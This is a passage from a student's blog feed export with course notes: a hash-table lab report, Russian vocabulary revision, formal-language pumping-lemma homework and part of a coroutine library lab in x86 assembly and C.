punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        hash <span class="token operator">=</span> hash <span class="token operator">*</span> seed <span class="token operator">+</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        hash <span class="token operator">%=</span> N<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> hash<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处参考了 <code>BKDR hash</code> 函数, 使用 <code>seed = 131</code> 作为种子, 可实现较为均匀的 <code>hash</code> 映射.</p><h4 id="poor-hashing"><a href="#poor-hashing" class="headerlink" title="poor_hashing"></a><code>poor_hashing</code></h4><p><code>poor_hashing</code> 函数定义为: $$poor_hashing(str)=89{\sum_{i = 0}^{len(str)-1} str[i]}%N.$$</p><p>由于 <code>ascii</code> 的大小为 <code>0~127</code>, 且字符串长度受限制, 生成的 <code>hash</code> 值最多不会超过 <code>200000</code>, 这导致了不均匀的到 <code>TABLE_SIZE</code> 的映射; 同时对字符串直接求和的操作很容易导致 <code>collision</code>.</p><h4 id="quadratic-probe"><a href="#quadratic-probe" class="headerlink" title="quadratic_probe"></a><code>quadratic_probe</code></h4><p>定义 <code>int dist</code> 为当前双向试探的试探长度, <code>bool direction</code> 为当前双向试探的试探方向. 每次执行 <code>init()</code> 时, 初始化 <code>dist = 0; direction = false;</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> quadratic_probe<span class="token operator">::</span><span class="token function">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    dist<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset<span class="token punctuation">,</span> pos<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>        direction <span class="token operator">=</span> false<span class="token punctuation">;</span>        offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>dist <span class="token operator">*</span> dist<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> table_size<span class="token punctuation">;</span>        pos <span class="token operator">=</span> last_choice <span class="token operator">-</span> offset<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> pos <span class="token operator">+=</span> table_size<span class="token punctuation">;</span>        <span class="token keyword">return</span> pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 依据 <code>direction</code> 的值决定偏移方向, 依据 <code>dist</code> 的大小决定偏移量.</p><h4 id="overflow-probe"><a href="#overflow-probe" class="headerlink" title="overflow_probe"></a><code>overflow_probe</code></h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>dynamic_cast<span class="token operator">&lt;</span>overflow_probe<span class="token operator">*</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>my_collision<span class="token punctuation">)</span><span class="token punctuation">)</span>    table_size <span class="token operator">=</span> <span class="token number">400031</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此处修改了测试框架, 若 <code>my_collision</code> 可成功动态转换为 <code>overflow_probe*</code> 指针, 此时使用公共溢出区策略, 将 <code>table_size</code> 修改为 <code>400031</code>.</p><p>定义 <code>int overflow_head</code> 为当前缓冲区的起始 <code>index</code>. 每次执行 <code>init()</code> 时, 初始化 <code>overflow_head = 400031</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> overflow_probe<span class="token operator">::</span><span class="token function">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> overflow_head<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 顺次遍历缓冲区直到返回一个可供插入词条的空位置.</p><h3 id="测试数据-222字"><a href="#测试数据-222字" class="headerlink" title="测试数据 (222字)"></a>测试数据 (222字)</h3><p><code>generator.cpp</code> 作为数据生成器.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* generator.cpp */</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">500000</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 产生 <code>1~500000</code> 内的随机数作为行号, 将 <code>poj.txt</code> 的该行信息作为输入数据;</p><p>使用 <code>ReadLine(filename, line)</code> 读入 <code>poj.txt</code> 的指定行信息;</p><p>使用 <code>GenerateInsert(srt)</code> 与 <code>GenerateQuery(srt)</code> , 通过 <code>string</code> 的 <code>substr()</code> 与 <code>find()</code> 方法从该行字符串中构造符合格式的输入数据;</p><p><code>shuffle_pattern</code> 决定是否对插入和删除操作进行打乱 (即随机化).</p><ul><li>数据 <code>01.in</code> 进行了 <code>40000</code> 次插入, <code>40000</code> 次查询,  遵循先插入后查询的次序;</li><li>数据 <code>02.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询, 遵循先插入后查询的次序; </li><li>数据 <code>03.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询,  遵循边插入边查询的次序.</li></ul><blockquote><p>生成数据的参数附在 <code>parameters.txt</code> 中.</p></blockquote><h3 id="分析结果-276字"><a href="#分析结果-276字" class="headerlink" title="分析结果 (276字)"></a>分析结果 (276字)</h3><ol><li>“好” 哈希函数的性能更佳. 因为 “坏” 哈希函数将字符串不均匀地映射到哈希表中, 容易导致<code>hash</code>聚集, 增大了冲突可能, 在处理冲突时会消耗更多时间.</li><li>双向平方试探性能更佳. 当数据规模较大时, 使用双向平方试探移动出冲突区域的效率较高; 同时, 比起使用 “坏” 哈希函数, 使用 “好” 哈希函数时这种移动的效率会更高.</li><li>使用 “好” 哈希函数时封闭散列性能略占优, 使用 “坏” 哈希函数时开放散列性能明显占优, 总体上开放散列性能占优. 在数据装填因子大、哈希函数均匀的情况下适合使用封闭散列.</li><li>这会导致字符串分布出现一定的规律性, 映射后的 <code>hash</code> 冲突较为严重, 使得性能出现下降.</li><li>模拟 <code>vector</code> 类的扩容, 在装填因子较大或较小时, 重新动态分配 <code>hash_entry* new_table</code>, 迁移原表数据, 并释放原指针即可.</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian Midterm Revision</title>
      <link href="/25/"/>
      <url>/25/</url>
      
        <content type="html"><![CDATA[<h3 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a><strong>及物动词</strong></h3><ul><li>есть; </li><li>делать, читать, считать, искать, знать, слушать; </li><li>смотреть, писать, учить.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать <strong>упражнение</strong>;</p></li><li><p>читать (读):</p><p>читать <strong>книгу</strong>; читать текст; читать диалог; читать <strong>стихи</strong> (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы; искать плащ; искать <strong>счастье</strong>; </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать <strong>русский язык</strong> (俄语); </p></li><li><p>слушать (听):</p><p>слушать <strong>музыку</strong>; слушать текст; слушать <strong>диалог</strong>; слушать <strong>стихи</strong>;</p></li><li><p>смотреть (看):</p><p>смотреть <strong>телевизор</strong> (电视); смотреть <strong>фильм</strong> (电影); </p></li><li><p>писать (写):</p><p>писать <strong>письмо</strong> (信); писать новые слова; писать диалог; писать <strong>стихи</strong>.</p></li></ol><h3 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a><strong>非及物动词</strong></h3><ul><li>работать, отдыхать, ужинать, играть, жить; </li><li>говорить, хотеть, обедать, учиться.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>~ дома; ~ в кафе; ~ в институте; ~ в <strong>буфете</strong> (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить <strong>по-русски</strong>; говорить <strong>по-китайски</strong>;</p></li><li><p>хотеть (想):</p><p>хотеть читать <strong>стихи</strong>; хотеть смотреть <strong>телевизор</strong>; хотеть слушать музыку.</p></li></ol><h3 id="会说十种语言"><a href="#会说十种语言" class="headerlink" title="会说十种语言"></a><strong>会说十种语言</strong></h3><p>говорить по-xxx</p><ul><li><strong>русски</strong> 俄语</li><li><strong>китайски</strong> 汉语</li><li>английски 英语</li><li>немецки 德语</li><li>французски 法语</li><li>японски 日语</li><li>корейски 朝鲜语</li><li>испански 西班牙语</li><li>арабски 阿拉伯语</li><li>итальянски 意大利语</li></ul><h3 id="时间表示法"><a href="#时间表示法" class="headerlink" title="时间表示法"></a><strong>时间表示法</strong></h3><ul><li>один час, час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h3 id="常用词组"><a href="#常用词组" class="headerlink" title="常用词组"></a><strong>常用词组</strong></h3><ul><li>我 / 你 / 您 / 他 / 她叫… : меня / тебя / вас / его / её зовут…;</li><li>在喷泉旁 : у фонтана;</li><li>您的儿子 : ваш сын;</li><li>我的朋友 : мой друг; <strong>моя подруга</strong>;</li><li>你们的新房子 : ваш новый дом;</li><li>我的旧作业本 : моя старая тетрадь;</li><li>他的新车 : его новая машина;</li><li>我们的旧桌子 : наш старый стол;</li><li>你们的旧花园 : ваш старый сад;</li><li>他们的新护照 : <strong>их новые паспорта</strong>; </li><li>在工厂工作 : работать на заводе; </li><li>在学院里工作 : работать в институте; </li><li>在剧院里工作 : работать в театре; </li><li>读书 : <strong>читать книгу</strong>;</li><li>懂俄语 : <strong>знать русский язык</strong>;</li><li>了解你 : <strong>знать тебя</strong>;</li><li>听音乐 : слушать музыку;?</li><li>在南方休息 :  отдыхать на юге;</li><li>在疗养院休息 : <strong>отдыхать в санатории</strong>;</li><li>在家休息 : отдыхать дома;</li><li>在家吃早餐 : <strong>завтракать дома</strong>;</li><li>在咖啡厅吃午餐 : обедать в кафе;</li><li>在小吃部吃晚餐 : <strong>ужинать в буфете</strong>;</li><li>在教室里做功课 : <strong>делать урок в аудитории</strong>;</li><li>在宿舍里做练习 : <strong>делать упражнение в общежитии</strong>;</li><li>踢足球 : играть в футбол;</li><li>下象棋 : играть в шахматы;</li><li>数香蕉 : считать бананы;</li><li>数菠萝 : считать ананасы;</li><li>写生词 : <strong>писать новые слова</strong>;</li><li>住在莫斯科 : жить в Москве;</li><li>住在上海 : жить в Шанхае;</li><li>说俄语 : <strong>говорить по-русски</strong>; </li><li>说汉语 : <strong>говорить по-китайски</strong>; </li><li>说英语 : <strong>говорить по-английски</strong>; </li><li>背单词 : <strong>учить новые слова</strong>; </li><li>渴望上大学 : <strong>хотеть учиться в университете</strong>; </li><li>渴望在俄罗斯留学 : <strong>хотеть учиться в России</strong>; </li><li>关于我 : <strong>обо мне</strong>; </li><li>3点钟 : три часа; </li><li>5点钟 : пять часов; </li><li>看电视 : <strong>смотреть телевизор</strong>;</li><li>看书 : <strong>читать книгу</strong>; </li><li>寻找教科书 : <strong>искать учебник</strong>; </li><li>今天、昨天、明天 : <strong>сегодня, вчера, завтра</strong>; </li><li>星期二、星期三、星期六 : <strong>вторник, среда, суббота</strong>; </li><li>请问 : <strong>скажите, пожалуйста</strong>;</li><li>几点钟 : <strong>который час</strong>; </li><li>很好 : <strong>очень хорошо</strong>.</li></ul><h3 id="常用问答句型"><a href="#常用问答句型" class="headerlink" title="常用问答句型"></a><strong>常用问答句型</strong></h3><ul><li><p>—Что вы делаете? </p><p>—Я читаю книгу. Я делаю урок.</p></li><li><p><strong>—Что Анна ищет?</strong> </p><p>—Она ищет плащ. </p></li><li><p>—Что ты учишь? </p><p>—Я учу новые слова. </p></li><li><p>—Что ты считаешь? </p><p>—Я считаю ананасы и бананы. </p></li><li><p>—Что они читают? </p><p>—Они читают текст и диалог. </p></li><li><p><strong>—Что ты хочешь делать?</strong> </p><p>—Я хочy учиться в институте. </p></li><li><p><strong>—Что ест твоя сестра (姐妹)?</strong> </p><p>—Она ест суп и салат. </p></li><li><p><strong>—Что учит твой брат?</strong> </p><p>—Он учит новые слова. </p></li><li><p><strong>—Что пишет Инна?</strong> </p><p><strong>—Она пишет письмо. (信)</strong></p></li><li><p><strong>—Что слушают дети?</strong> </p><p>—Они слушают музыку. </p></li><li><p><strong>—Где ты завтракаешь обычно?</strong> </p><p>—Я обычно завтракаю дома. </p></li><li><p><strong>—Где работает твой отец?</strong> </p><p>—Он работает в институте. </p></li><li><p><strong>—Где учится Витя?</strong></p><p>—Он учится в школе. </p></li><li><p>—Где живёт Антон? </p><p>—Он живёт в Санкт-Петербурге. </p></li><li><p><strong>—Который час сейчас?</strong> </p><p><strong>—Сейчас восемь часов.</strong> </p></li><li><p><strong>—Почему Антон много работает?</strong> </p><p>—Он хочет учиться в институте. </p></li><li><p>—Миша живёт в Москве или в Баку?</p><p>—Он живёт в Москве. </p></li><li><p><strong>—Они часто говорят о тебе?</strong> </p><p>—Да, они часто говорят обо мне. </p></li><li><p>—Это стакан? </p><p>—Нет, это ваза. </p></li><li><p><strong>—Чей это шкаф?</strong> </p><p>—Это мой шкаф. </p></li><li><p><strong>—Какая это комната?</strong> </p><p>—Это новая комната. </p></li><li><p><strong>—Как ты говоришь по-русски?</strong> </p><p>—Я говорю по-русски очень хорошо. </p></li><li><p>—Как его зовут?</p><p>—Его зовут Пётр. </p></li><li><p><strong>—Как работает твой брат?</strong> </p><p>—Он работает очень хорошо.</p></li></ul><h3 id="以-b-结尾阳性名词"><a href="#以-b-结尾阳性名词" class="headerlink" title="以 b 结尾阳性名词"></a><strong>以 b 结尾阳性名词</strong></h3><ul><li>словарь (字典), гость (客人), конь (公马);</li></ul><h3 id="以-b-结尾阴性名词"><a href="#以-b-结尾阴性名词" class="headerlink" title="以 b 结尾阴性名词"></a><strong>以 b 结尾阴性名词</strong></h3><ul><li>мать (妈妈), ночь (夜晚), тетрадь (练习本), обувь (鞋子总称), осень (秋天);</li><li>пять, шесть, семь, восемь, девять, десять, одиннадцать, двенадцать (数词).</li></ul><h3 id="六格"><a href="#六格" class="headerlink" title="六格"></a><strong>六格</strong></h3><ul><li><strong>第一格: 主格</strong>, 通常作为主语或谓语.</li><li><strong>第二格: 所属格</strong>, 通常置于它所说明的名词之后, 如 остановка автобуса (公共汽车停车站), сады России (俄罗斯的花园).</li><li><strong>第三格: 给格</strong>, 如 “妈妈给儿子买了新书包” 中 “儿子” 要变第三格.</li><li><strong>第四格:</strong> <ul><li>第一个意义: <strong>客体格</strong>, 表示行为的客体, 如 Он ест суп (他在吃汤), Как тебя зовут (你叫什么名字). </li><li>第二个意义: <strong>方向格</strong>, 如 Я иду на урок. (我去上课), 公式为 运动动词 + на(去…上) 或в(去…里) + 第四格 = 方向. </li><li>第三个意义: <strong>在时间内</strong>, 如 в субботу (在星期六), 公式为 в + 表示时间的名词第四格.</li></ul></li><li><strong>第五格: 工具格</strong>, 如 Антон пишет упражнение ручкой (安东用签字笔写练习).</li><li><strong>第六格: 处所格, 也称前置格</strong>, 必须永远跟着前置词, 表示 “在…地方”, “关于…人、…事儿”, 如 на столе (在桌子上), в столе (在桌子里), о Пушкине (关于普希金), о саде (关于花园).</li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业5</title>
      <link href="/24/"/>
      <url>/24/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-4-1-1-e"><a href="#Ex-4-1-1-e" class="headerlink" title="Ex 4.1.1 (e)"></a>Ex 4.1.1 (e)</h3><p>​    对于任意的 $n \ge 1$, 存在 $w = 0^n1^n\in\left{0^n1^m\mid n\le m\right}$.</p><p>​    考虑任意 $x, y, z$ 满足 $w = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    $$xy^2z = 0^{n + i}1^n\notin\left{0^n1^m\mid n\le m\right}.$$</p><p>​    因此 $w$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-1-2-e"><a href="#Ex-4-1-2-e" class="headerlink" title="Ex 4.1.2 (e)"></a>Ex 4.1.2 (e)</h3><p>​    对于任意的 $n \ge 1$, 存在 $\omega = 0^n10^n1\in\left{ww\mid w\in{0, 1}^{*}\right}$.</p><p>​    考虑任意 $x, y, z$ 满足 $\omega = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    $$xy^2z = 0^{n + i}10^n1\notin\left{ww\mid w\in{0, 1}^{*}\right}.$$</p><p>​    因此 $\omega$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-1-2-f"><a href="#Ex-4-1-2-f" class="headerlink" title="Ex 4.1.2 (f)"></a>Ex 4.1.2 (f)</h3><p>​    对于任意的 $n \ge 1$, 存在 $\omega = 0^n110^n\in\left{ww^R\mid w\in{0, 1}^{*}\right}$.</p><p>​    考虑任意 $x, y, z$ 满足 $\omega = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    $$xy^2z = 0^{n + i}110^n\notin\left{ww\mid w\in{0, 1}^{*}\right}.$$</p><p>​    因此 $\omega$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-2-1-d"><a href="#Ex-4-2-1-d" class="headerlink" title="Ex 4.2.1 (d)"></a>Ex 4.2.1 (d)</h3><p>​    注意到 $L = {0, 12}$,</p><p>​    那么 $h(L) = {h(0), h(12)} = {a, abba}$.</p><h3 id="Ex-4-2-2"><a href="#Ex-4-2-2" class="headerlink" title="Ex 4.2.2"></a>Ex 4.2.2</h3><p>​    考虑一个与正则语言 $L$ 等价的 $DFA$:</p><p>​    $$A = \left{Q, \Sigma, \delta, q, F_A\right}.$$</p><p>​    我们构造</p><p>​    $$B = \left{Q, \Sigma, \delta, q, F_B\right}.$$</p><p>​    其中</p><p>​    $$q_0\in F_B\Longleftrightarrow\delta(q_0, a)\in F_A.$$</p><p>​    那么容易得到 $B$ 接受字符串 $w$ 当且仅当 $A$ 接受字符串 $wa$.</p><p>​    也即 $DFA$ 与语言 $L/a$ 等价, $L/a$ 为正则语言.</p><h3 id="Ex-4-2-3"><a href="#Ex-4-2-3" class="headerlink" title="Ex 4.2.3"></a>Ex 4.2.3</h3><p>​    注意到</p><p>​    $$a/L=(L^R/a)^R,$$</p><p>​    又因为正规语言的商运算和反向运算都是封闭的, </p><p>​    因此若 $L$ 是正则语言, 那么 $L/a$ 是正则语言, 进而 $a/L$ 是正则语言.</p><h3 id="Ex-4-2-8"><a href="#Ex-4-2-8" class="headerlink" title="Ex 4.2.8"></a>Ex 4.2.8</h3><p>​    考虑一个与正则语言 $L$ 等价的 $DFA$:</p><p>​    $$A = \left{Q, \Sigma, \delta, q_0, F\right}.$$</p><p>​    我们构造一个 $DFA$</p><p>​    $$B = \left{Q’, \Sigma, \delta’, q_0’, F’\right}.$$</p><p>​    其中</p><p>​    $$Q’ = {[q, S]\mid q\in Q, S\subseteq Q, \mbox{若 $q_0$ 到 $q$ 的路径长 $l$},$$<br>​    $$\mbox{则}\thinspace p\in S\Longleftrightarrow \mbox{存在长 $l$ 的从 $p$ 到某个终态的路径}.}$$<br>​    $$q_0’ = [q_0, F].$$<br>​    $$F’ = \left{[q, S]\mid q\in S\right}$$</p><p>​    下面定义转移函数 $\delta’$:</p><p>​    $$\delta’([q, S], a) = [\delta(q, a), T],$$</p><p>​    其中</p><p>​    $$t\in T\Longleftrightarrow \exists\thinspace s\in S, \mbox{使}\thinspace t \thinspace\mbox{到}\thinspace s \thinspace\mbox{有一条转移边}.$$</p><p>​    易得这个 $DFA B$ 与我们定义的 $half(L)$ 等价, </p><p>​    故若 $L$ 为正则语言, 那么 $half(L)$ 亦为正则语言.</p><h3 id="Ex-4-2-13-a"><a href="#Ex-4-2-13-a" class="headerlink" title="Ex 4.2.13 (a)"></a>Ex 4.2.13 (a)</h3><p>​    注意到</p><p>​    $$\left{0^i1^j\mid i\ne j\right} = \left{0, 1\right}^{*} - \left{0^n1^n\mid n\ge 0\right}.$$</p><p>​    若 $\left{0^i1^j\mid i\ne j\right}$ 为正规语言, </p><p>​    由于正规语言的闭包运算、补运算都是封闭的,</p><p>​    可得 $L_{0n1n} = \left{0^n1^n\mid n\ge 0\right}$ 也是正规语言, 这与已知矛盾.</p><p>​    因此 $\left{0^i1^j\mid i\ne j\right}$ 非正规语言.</p><h3 id="Ex-4-2-13-b"><a href="#Ex-4-2-13-b" class="headerlink" title="Ex 4.2.13 (b)"></a>Ex 4.2.13 (b)</h3><p>​    考虑映射</p><p>​    $$h: \left{0, 1, 2\right}^{<em>}\Longrightarrow\left{0, 1\right}^{</em>},$$</p><p>​    其中</p><p>​    $$h(0) = 0, h(1) = h(2) = 1.$$</p><p>​    从而</p><p>​    $$h(\left{0^n1^m2^{n - m}\mid n\ge m\ge 0\right}) = \left{0^n1^n\mid n\ge 0\right} = L_{0n1n}.$$</p><p>​    由于正规语言的同态运算具有封闭性, 且 $L_{0n1n}$ 非正规语言,</p><p>​    从而 $\left{0^n1^m2^{n - m}\mid n\ge m\ge 0\right}$ 非正规语言.</p><h3 id="Ex-4-3-4"><a href="#Ex-4-3-4" class="headerlink" title="Ex 4.3.4"></a>Ex 4.3.4</h3><p>​    设 $DFA$</p><p>​    $$A_1 = (Q_1, \Sigma, \delta_1, q_1, F_1),$$</p><p>​    和 $DFA$</p><p>​    $$A_2 = (Q_2, \Sigma, \delta_2, q_2, F_2).$$</p><p>​    的语言分别为 $L_1$ 和 $L_2$, 我们构造 $DFA$</p><p>​    $$A = (Q_1 \times Q_2 , \Sigma, \delta, \left&lt;q_1, q_2\right&gt; , F_1 \times F_2),$$</p><p>​    其中</p><p>​    $$\delta(\left&lt;p, q\right&gt;, a)= \left&lt;\delta_1(p, a), \delta_2(q, a)\right&gt;.$$ </p><p>​    那么 $L(A)= L_1\cap L_2$, 只需判定该 $A$ 中从初态是否可达某一终态即可. </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 1</title>
      <link href="/23/"/>
      <url>/23/</url>
      
        <content type="html"><![CDATA[<h2 id="Task-1-协程库的编写"><a href="#Task-1-协程库的编写" class="headerlink" title="Task 1: 协程库的编写"></a>Task 1: 协程库的编写</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># lib/context.S.global coroutine_switchcoroutine_switch:    # 保存栈顶地址到 %rdi 指向的上下文    movq %rsp, 64(%rdi)    # 保存 callee-saved 寄存器到 %rdi 指向的上下文    movq %rbx, 72(%rdi)    movq %rbp, 80(%rdi)    movq %r12, 88(%rdi)    movq %r13, 96(%rdi)    movq %r14, 104(%rdi)    movq %r15, 112(%rdi)    # 利用 rip 相对寻址使 rip 指向 ret 指令的地址 (.coroutine_ret)    leaq .coroutine_ret(%rip), %rax    movq %rax, 120(%rdi)    # 从 %rsi 指向的上下文恢复栈顶地址    movq 64(%rsi), %rsp    # 从 %rsi 指向的上下文恢复 callee-saved 寄存器    movq 72(%rsi), %rbx    movq 80(%rsi), %rbp    movq 88(%rsi), %r12    movq 96(%rsi), %r13    movq 104(%rsi), %r14    movq 112(%rsi), %r15    # jmpq 到上下文保存的 rip    jmpq *120(%rsi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* inc/context.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    bool all_finished <span class="token operator">=</span> false<span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> true<span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> false<span class="token punctuation">;</span>                <span class="token comment">// 记录正在执行的协程 id</span>                context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                <span class="token comment">// 调用 resume() 返回调度器</span>                coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_pool<span class="token operator">-&gt;</span>is_parallel<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 从 g_pool 中获取当前协程状态</span>        <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 调用 coroutine_switch 切换到 coroutine_pool 上下文</span>        <span class="token comment">// 保存 caller-saved 寄存器, 恢复 callee-saved 寄存器</span>        <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span 